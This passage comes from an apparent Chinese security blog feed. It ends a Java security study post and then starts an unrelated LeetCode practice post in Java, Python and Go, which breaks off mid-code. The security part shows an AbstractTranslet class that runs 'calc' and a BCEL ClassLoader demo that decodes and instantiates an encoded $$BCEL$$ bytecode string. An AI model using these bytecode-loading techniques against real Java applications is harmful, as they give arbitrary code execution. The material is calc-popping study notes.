punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">Calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的字节码导入原来的demo中就可以触发。</p><h2 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h2><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为 被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的 原生库中。</p><p>BCEL 提供两个可以利用的类 ，Repository和 Utility 。Repository 用于将 Java Class转化成原生字节码，当然也可以用  javac 来编译生成字节码。Utility 用于将字节码转化成BCEL 格式的字节码。</p><p>BCEL这个包中有个有趣的类com.sun.org.apache.bcel.internal.util.ClassLoader，他是一个ClassLoader，但是他重写了Java内置的ClassLoader#loadClass()方法。</p><p>在ClassLoader#loadClass()中，其会判断类名是否是$$BCEL$$开头，如果是的话，将会对这个字符串进行decode。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>bytecode</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span></span><span class="token class-name">Repository</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ClassLoader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span></span><span class="token class-name">JavaClass</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span></span><span class="token class-name">Utility</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BCELDeml</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token class-name">JavaClass</span> cls <span class="token operator">=</span> <span class="token class-name">Repository</span><span class="token punctuation">.</span><span class="token function">lookupClass</span><span class="token punctuation">(</span><span class="token class-name">Calc</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> code<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$"</span><span class="token operator">+</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token comment">//encode();</span>        <span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"$l$8b$I$A$A$A$A$A$A$AmQ$cbN$e3$40$Q$acI$9c$d81$O$n$81$f0$86$ddey$E$O$eb$L7$Q$X$E$S$c2$3cD$Q$9c$t$b3$a30$accG$ce$E$c1$Xq$e6$c2$o$O$7c$A$l$85$e8$Z$9e$SX$f2$f4twUu$b5$fd$f8t$ff$A$60$V$8b$3e$3c$8c$f9$Y$c7$84$87I$T$a7$5cL$fb$u$60$c6$c5$ac$8b$l$M$c5u$95$u$bd$c1$90o$y$9f08$9b$e9_$c9P$89T$o$f7$fb$9d$96$cc$8ey$x$a6J$zJ$F$8fOx$a6L$feZt$f4$99$ea1$MG$o$ed$84$ad$x$z$F$b1$c3M$k$8b5$Go$5d$c4$af$da$8c$b0$f5$e8$9c_$f0P$a5$e1$ce$c1$d6$a5$90$5d$ad$d2$84$60$e5$a6$e6$e2$df$k$efZM$b2$c7$e07$d3$7e$s$e4$b623JF$ee$8f$e1$G$u$c1w$f13$c0$_$cc$d1p$f2$p$C$fc$c6$3c9$f8F$3b$c0$C$7c$86$ea$Xo$MC$W$k$f3$a4$j$k$b4$ce$a5$d0$E$fb$u$j$f5$T$ad$3a4$daoK$fd$9e$d4$h$cb$d1$X$M$f9w$e4$a5$q$c9$a5$c6$a7nSg$wi$af$7d$s$if$a9$90$bd$k$R$w$5djj$bb$f5q$c6$85$a4m$5c$faM$e6$c9$81$99$j$e9$i$a0$y$a4$c8$u$WV$fe$83$dd$d8v$40g$d1$W$j$94$e9$M$5e$A$YD$85$a2$87$a1w2$b7b$40$ed$O$b9Z$fe$W$ce$e95$bc$dd$95$5b$Uol$bdD$dc$C$f2Vq$94n$86$5d$o$a6$f9$c8eR$a9$d2$edmB$99$a6UQ$a3l$98$5e$X$b9$c8$c5$88C$8d$ba55$fa$M$ad$5d$a2Ap$C$A$A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>bytecode</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span>  <span class="token punctuation">{</span>    <span class="token keyword">static</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> java web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web手的leetcode刷题记录</title>
      <link href="/2022/03/15/leetcode/"/>
      <url>/2022/03/15/leetcode/</url>
      
        <content type="html"><![CDATA[<h1 id="leetcode"><a href="#leetcode" class="headerlink" title="leetcode"></a>leetcode</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>淦 作为一个web手为了面大厂还是要低下头去刷leetcode。虽然嘴很硬说 考算法的渗透测试岗永远得不到我，但是没人会选择放弃BAT这种大厂的实习机会。顺便加强一下自己的代码能力吧。本篇文章的题目都尽量使用三种语言进行解题，分别是Java，python3和golang。python3应该是写起来手感更好的语言，但是因为最近在卷Java web和golang，不得不向生活低下了头。毕竟网络安全从业人员不能有短板。</p><h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><p>示例 1：</p><p>输入：nums = [2,7,11,15], target = 9<br>输出：[0,1]<br>解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。<br>示例 2：</p><p>输入：nums = [3,2,4], target = 6<br>输出：[1,2]<br>示例 3：</p><p>输入：nums = [3,3], target = 6<br>输出：[0,1]</p></blockquote><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">easy</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">twoSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>target <span class="token operator">-</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"No two sum solution"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TwoCounts</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> main <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Solution</span> solution <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numList <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> target <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> answer <span class="token operator">=</span> solution<span class="token punctuation">.</span><span class="token function">twoSum</span><span class="token punctuation">(</span>numList<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> answer<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> x <span class="token operator">=</span> answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先定义一个map，使用target减去该值，如果结果存在于map的key值中，则判断存在，返回map的value值和该元素在数组中的下标。如果不存在则将其存入map。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">twoSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span>                <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的python和golang代码就是暴力穷举的思路</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">twoSum</span><span class="token punctuation">(</span>nums <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> target <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> x <span class="token operator">:=</span> <span class="token keyword">range</span> nums <span class="token punctuation">{</span>        <span class="token keyword">for</span> j <span class="token operator">:=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> x<span class="token operator">+</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> target <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span>i<span class="token punctuation">,</span> j<span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>给你一个整数 x ，如果 x 是一个回文整数，返回 true ；否则，返回 false 。</p><p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><p>例如，121 是回文，而 123 不是。</p></blockquote><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        string <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        restring <span class="token operator">=</span> string<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> string <span class="token operator">==</span> restring<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字符串倒叙使用**string[::-1]**即可</p><h3 id="罗马数字专整数"><a href="#罗马数字专整数" class="headerlink" title="罗马数字专整数"></a>罗马数字专整数</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。</p><p>字符          数值<br>I             1<br>V             5<br>X             10<br>L             50<br>C             100<br>D             500<br>M             1000<br>例如， 罗马数字 2 写做 II ，即为两个并列的 1 。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：</p><p>I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。<br>X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。<br>C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。<br>给定一个罗马数字，将其转换成整数。</p></blockquote><h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">romanToInt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>        dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'I'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">:</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token string">'IV'</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'IX'</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'XL'</span><span class="token punctuation">:</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token string">'XC'</span><span class="token punctuation">:</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token string">'CD'</span><span class="token punctuation">:</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token string">'CM'</span><span class="token punctuation">:</span><span class="token number">900</span><span class="token punctuation">}</span> <span class="token comment">#构建哈希表</span>        tmp <span class="token operator">=</span> <span class="token number">0</span>        n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        i <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            tmp1 <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> tmp1 <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                tmp <span class="token operator">=</span> tmp <span class="token operator">+</span> dic<span class="token punctuation">[</span>tmp1<span class="token punctuation">]</span>                i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">2</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                tmp <span class="token operator">=</span> tmp <span class="token operator">+</span> dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>                i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>            tmp <span class="token operator">=</span> tmp <span class="token operator">+</span> dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">romanToInt</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token 